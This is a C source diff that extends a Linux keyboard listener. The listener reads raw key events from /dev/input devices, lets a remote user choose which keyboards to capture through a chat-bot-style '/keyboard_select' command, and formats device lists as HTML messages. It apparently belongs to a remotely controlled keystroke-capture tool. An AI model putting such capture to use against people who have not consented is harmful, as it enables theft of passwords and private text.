@@ -17,10 +17,10 @@
 
 #include "keyboard.h"
 #include "keyboard_output.h"
-#include "../config/config.h"
 #include "../logging/logging.h"
 #include "../runtime/runtime.h"
 
+#include <ctype.h>
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
@@ -40,11 +40,49 @@
 typedef struct {
     int fd;
     char path[256];
+    char name[256];
 } keyboard_device_t;
 
 static pthread_t listener_thread;
 static int listener_started;
 static volatile int stopping;
+static pthread_mutex_t devices_lock = PTHREAD_MUTEX_INITIALIZER;
+static char selected_target[256] = "all";
+static int selected_index = -1; /* -1 = all, >= 0 = index, -2 = string */
+static keyboard_device_t active_devices[MAX_KEYBOARD_DEVICES];
+static int active_device_count;
+
+static const char *c2t_strcasestr(const char *haystack, const char *needle)
+{
+    if (!haystack || !needle) return nullptr;
+    if (!*needle) return haystack;
+    size_t needle_len = strlen(needle);
+    for (; *haystack; haystack++) {
+        if (strncasecmp(haystack, needle, needle_len) == 0) {
+            return haystack;
+        }
+    }
+    return nullptr;
+}
+
+static int is_device_selected_locked(int index, const char *path, const char *name)
+{
+    if (selected_index == -1 || strcmp(selected_target, "all") == 0 || strcmp(selected_target, "*") == 0)
+        return 1;
+    if (selected_index >= 0 && selected_index == index)
+        return 1;
+    if (path && strcmp(selected_target, path) == 0)
+        return 1;
+    if (path) {
+        const char *slash = strrchr(path, '/');
+        if (slash && strcmp(slash + 1, selected_target) == 0)
+            return 1;
+    }
+    if (name && c2t_strcasestr(name, selected_target) != nullptr)
+        return 1;
+    return 0;
+}
+
 
 static int shift_active;
 static int caps_lock_active;
@@ -388,7 +426,15 @@ static void add_device(keyboard_device_t *devices, int *count, const char *path)
 
     devices[*count].fd = fd;
     snprintf(devices[*count].path, sizeof(devices[*count].path), "%s", path);
+    snprintf(devices[*count].name, sizeof(devices[*count].name), "%s", name);
     (*count)++;
+
+    pthread_mutex_lock(&devices_lock);
+    if (*count <= MAX_KEYBOARD_DEVICES) {
+        active_devices[*count - 1] = devices[*count - 1];
+        active_device_count = *count;
+    }
+    pthread_mutex_unlock(&devices_lock);
 
     c2t_log_info("keyboard", "Listening on keyboard device: %s (%s)", path, name);
 }
@@ -405,6 +451,13 @@ static void remove_device(keyboard_device_t *devices, int *count, int index)
         devices[i] = devices[i + 1];
     }
     (*count)--;
+
+    pthread_mutex_lock(&devices_lock);
+    for (int i = 0; i < *count; i++) {
+        active_devices[i] = devices[i];
+    }
+    active_device_count = *count;
+    pthread_mutex_unlock(&devices_lock);
 }
 
 static int scan_and_attach_keyboards(keyboard_device_t *devices, int *count)
@@ -419,7 +472,7 @@ static int scan_and_attach_keyboards(keyboard_device_t *devices, int *count)
     struct dirent *entry;
     char path[256];
 
-    while ((entry = readdir(d)) != NULL) {
+    while ((entry = readdir(d)) != nullptr) {
         if (strncmp(entry->d_name, "event", 5) != 0)
             continue;
 
@@ -536,10 +589,16 @@ int keyboard_listen(void)
                     continue;
                 }
 
-                size_t count = (size_t)bytes / sizeof(struct input_event);
-                for (size_t j = 0; j < count; j++) {
-                    if (events[j].type == EV_KEY) {
-                        translate_and_emit_key(events[j].code, events[j].value != 0);
+                pthread_mutex_lock(&devices_lock);
+                int selected = is_device_selected_locked(i, devices[i].path, devices[i].name);
+                pthread_mutex_unlock(&devices_lock);
+
+                if (selected) {
+                    size_t count = (size_t)bytes / sizeof(struct input_event);
+                    for (size_t j = 0; j < count; j++) {
+                        if (events[j].type == EV_KEY) {
+                            translate_and_emit_key(events[j].code, events[j].value != 0);
+                        }
                     }
                 }
             }
@@ -553,6 +612,10 @@ int keyboard_listen(void)
     if (inotify_fd >= 0) {
         close(inotify_fd);
     }
+
+    pthread_mutex_lock(&devices_lock);
+    active_device_count = 0;
+    pthread_mutex_unlock(&devices_lock);
 
     keyboard_output_flush();
     return 0;
@@ -596,4 +659,122 @@ void keyboard_listener_cleanup(void)
     stopping = 1;
     (void)pthread_join(listener_thread, nullptr);
     listener_started = 0;
+}
+
+int keyboard_get_device_list(char *buffer, size_t max_len)
+{
+    if (!buffer || max_len == 0)
+        return 0;
+
+    pthread_mutex_lock(&devices_lock);
+
+    keyboard_device_t temp_devs[MAX_KEYBOARD_DEVICES];
+    int count = 0;
+
+    if (active_device_count > 0) {
+        count = active_device_count;
+        for (int i = 0; i < count; i++) {
+            temp_devs[i] = active_devices[i];
+        }
+    } else {
+        const char *dir = "/dev/input";
+        DIR *d = opendir(dir);
+        if (d) {
+            struct dirent *entry;
+            char path[256];
+            while ((entry = readdir(d)) != nullptr && count < MAX_KEYBOARD_DEVICES) {
+                if (strncmp(entry->d_name, "event", 5) != 0)
+                    continue;
+                snprintf(path, sizeof(path), "%s/%s", dir, entry->d_name);
+                if (is_keyboard(path)) {
+                    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+                    if (fd >= 0) {
+                        char name[256] = "Unknown";
+                        (void)ioctl(fd, EVIOCGNAME(sizeof(name)), name);
+                        close(fd);
+                        snprintf(temp_devs[count].path, sizeof(temp_devs[count].path), "%s", path);
+                        snprintf(temp_devs[count].name, sizeof(temp_devs[count].name), "%s", name);
+                        temp_devs[count].fd = -1;
+                        count++;
+                    }
+                }
+            }
+            closedir(d);
+        }
+    }
+
+    if (count == 0) {
+        snprintf(buffer, max_len,
+                 "⌨️ <b>Keyboard Devices:</b>\n\n"
+                 "⚠️ <i>No keyboard devices found in /dev/input.</i>\n"
+                 "(Check read permissions for /dev/input/event*)");
+        pthread_mutex_unlock(&devices_lock);
+        return 1;
+    }
+
+    size_t offset = (size_t)snprintf(buffer, max_len,
+                                     "⌨️ <b>Detected Keyboard Devices (%d):</b>\n\n", count);
+
+    for (int i = 0; i < count && offset + 128 < max_len; i++) {
+        int active = is_device_selected_locked(i, temp_devs[i].path, temp_devs[i].name);
+        offset += (size_t)snprintf(buffer + offset, max_len - offset,
+                                  "• <b>[%d]</b> <code>%s</code>\n"
+                                  "  🏷️ <i>%s</i> — %s\n",
+                                  i,
+                                  temp_devs[i].path,
+                                  temp_devs[i].name[0] ? temp_devs[i].name : "Standard Keyboard",
+                                  active ? "🟢 <b>ACTIVE</b>" : "⚪ <i>MUTED</i>");
+    }
+
+    if (offset + 128 < max_len) {
+        snprintf(buffer + offset, max_len - offset,
+                 "\n🎯 <b>Current Target:</b> <code>%s</code>\n"
+                 "💡 <i>Select device with <code>/keyboard_select &lt;id|all&gt;</code></i>",
+                 selected_target);
+    }
+
+    pthread_mutex_unlock(&devices_lock);
+    return 1;
+}
+
+int keyboard_select_device(const char *target)
+{
+    pthread_mutex_lock(&devices_lock);
+    if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
+        selected_index = -1;
+        snprintf(selected_target, sizeof(selected_target), "all");
+    } else {
+        int is_num = 1;
+        for (const char *p = target; *p; p++) {
+            if (!isdigit((unsigned char)*p)) {
+                is_num = 0;
+                break;
+            }
+        }
+        if (is_num) {
+            selected_index = atoi(target);
+            snprintf(selected_target, sizeof(selected_target), "%d", selected_index);
+        } else {
+            selected_index = -2;
+            snprintf(selected_target, sizeof(selected_target), "%s", target);
+        }
+    }
+    pthread_mutex_unlock(&devices_lock);
+    return 1;
+}
+
+void keyboard_get_selected_target(char *buffer, size_t max_len)
+{
+    if (!buffer || max_len == 0) return;
+    pthread_mutex_lock(&devices_lock);
+    snprintf(buffer, max_len, "%s", selected_target);
+    pthread_mutex_unlock(&devices_lock);
+}
+
+int keyboard_get_device_count(void)
+{
+    pthread_mutex_lock(&devices_lock);
+    int count = active_device_count;
+    pthread_mutex_unlock(&devices_lock);
+    return count;
 }
